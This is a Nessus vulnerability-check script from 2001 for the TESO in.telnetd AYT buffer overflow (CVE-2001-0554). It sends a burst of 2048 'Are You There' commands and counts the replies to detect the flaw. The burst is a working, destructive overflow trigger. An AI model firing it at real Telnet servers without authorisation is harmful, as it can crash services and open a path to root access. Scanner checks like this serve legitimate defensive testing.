#
# Test TESO in.telnetd buffer overflow
#
# Copyright (c) 2001 Pavel Kankovsky, DCIT s.r.o. <kan@dcit.cz>
# Permission to copy, modify, and redistribute this script under
# the terms of the GNU General Public License is hereby granted.
#
# The kudos for an idea of counting of AYT replies should go
# to Sebastian <scut@nb.in-berlin.de> and Noam Rathaus
# <noamr@beyondsecurity.com>.
#
#
# rd: tested against Solaris 2.8, RH Lx 6.2, FreeBSD 4.3 (patched & unpatched)

if (description) {
   script_id(10709);
   if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2001-t-0008");
   script_bugtraq_id(3064);
   script_version ("$Revision: 1.19 $");
   script_cve_id("CVE-2001-0554");
 
  name["english"] = "TESO in.telnetd buffer overflow";
  script_name(english:name["english"]);
 
  desc["english"] = "
The Telnet server does not return an expected number of replies
when it receives a long sequence of 'Are You There' commands.
This probably means it overflows one of its internal buffers and
crashes. It is likely an attacker could abuse this bug to gain
control over the remote host's superuser.

For more information, see:
http://www.team-teso.net/advisories/teso-advisory-011.tar.gz

Solution: Comment out the 'telnet' line in /etc/inetd.conf.
Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Attempts to overflow the Telnet server buffer";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
 
  script_copyright(english:"This script is Copyright (C) 2001 Pavel Kankovsky");

  family["english"] = "Gain root remotely";
  script_family(english:family["english"]);

  # Must run AFTER ms_telnet_overflow-004.nasl
  script_dependencie("find_service.nes", "ms_telnet_overflow.nasl");

  script_require_ports("Services/telnet", 23);
  exit(0);
}

#
# The script code starts here.
#
include('telnet_func.inc');

iac_ayt = raw_string(0xff, 0xf6);
iac_ao  = raw_string(0xff, 0xf5);
iac_will_naol = raw_string(0xff, 0xfb, 0x08);
iac_will_encr = raw_string(0xff, 0xfb, 0x26);

#
# This helper function counts AYT responses in the input stream.
# The input is read until 1. the expected number of responses is found,
# or 2. EOF or read timeout occurs.
#
# At this moment, any occurence of "Yes" or "yes" is supposed to be such
# a response. Of course, this is wrong: some FreeBSD was observed to react
# with "load: 0.12  cmd: .log 20264 [running] 0.00u 0.00s 0% 620k"
# when the telnet negotiation have been completed. Unfortunately, adding
# another pattern to this code would be too painful (hence the negotiation
# tricks in attack()).
#
# In order to avoid an infinite loop (when testing a host that generates
# lots of junk, intentionally or unintentionally), I stop when I have read
# more than 100 * max bytes.
#
# Please note builtin functions like ereg() or egrep() cannot be used
# here (easily) because they choke on '\0' and many telnet servers send
# this character
#
# Local variables: num, state, bytes, a, i, newstate
#

function count_ayt(sock, max) {
  num = 0; state = 0;
  bytes = 100 * max;
  while (bytes >= 0) {
    a = recv(socket:sock, length:1024);
    if (!a) return (num);
    bytes = bytes - strlen(a);
    for (i = 0; i < strlen(a); i = i + 1) {
      newstate = 0;
      if ((state == 0) && ((a[i] == "y") || (a[i] == "Y")))
        newstate = 1;
      if ((state == 1) && (a[i] == "e"))
        newstate = 2;
      if ((state == 2) && (a[i] == "s")) {
        # DEBUG display("hit ", a[i-2], a[i-1], a[i], "\n");
        num = num + 1;
        if (num >= max) return (num);
        newstate = 0;
      }
      state = newstate;
    }
  }
  # inconclusive result
  return (-1);
}

#
# This functions tests the vulnerability. "negotiate" indicates whether
# full telnet negotiation should be performed using telnet_init().
# Some targets might need it while others, like FreeBSD, fail to respond
# to AYT in an expected way when the negotiation is done (cf. comments
# accompanying count_ayt()).
#
# Local variables: r, total, size, bomb, succ
#

function attack(port, negotiate) {
  succ = 0;
  soc = open_sock_tcp(port);
  if (!soc) return (0);
  if (negotiate)
    # standard negotiation
    r = telnet_negotiate(socket:soc);
  else {
    # wierd BSD magic, is is necessary?
    send(socket:soc, data:iac_will_naol);
    send(socket:soc, data:iac_will_encr);
    r = 1;
  }
  if (r) {
    # test whether the server talks to us at all
    # and whether AYT is supported
    send(socket:soc, data:iac_ayt);
    r = count_ayt(sock:soc, max:1);
    # DEBUG display("probe ", r, "\n");
    if (r >= 1) { 
      # test whether too many AYT's make the server die
      total = 2048; size = total * strlen(iac_ayt);
      bomb = iac_ao + crap(length:size, data:iac_ayt);
      send(socket:soc, data:bomb);
      r = count_ayt(sock:soc, max:total);
      # DEBUG
#display("attack ", r, " expected ", total, "\n");
      if ((r >= 0) && (r < total)) succ = 1;
    }
  }
  close(soc);
  return (succ);
}

#
# The main program.
#

port = get_kb_item("Services/telnet");
if (!port) port = 23;

if (get_port_state(port)) {
  success = attack(port:port, negotiate:0);
  if (!success) success = attack(port:port, negotiate:1);
  if (success) security_hole(port);
}

